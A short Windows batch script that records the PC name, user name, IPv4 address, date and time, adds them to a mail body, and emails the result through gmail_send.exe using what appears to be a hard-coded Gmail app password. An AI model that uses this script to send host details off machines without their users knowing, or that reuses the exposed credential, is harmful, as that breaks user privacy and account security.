@echo off
cd /d "%~dp0"

echo PC=%COMPUTERNAME%  >  log.txt
echo USERNAME=%USERNAME%  >>  log.txt
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
    echo IP=%%a >> log.txt
)
echo DATE=%DATE%  >>  log.txt
echo TIME=%TIME%  >>  log.txt

del mail.txt
copy  mailbody.txt + log.txt  mail.txt
gmail_send.exe  meklkcfwfukbffuk   mail.txt 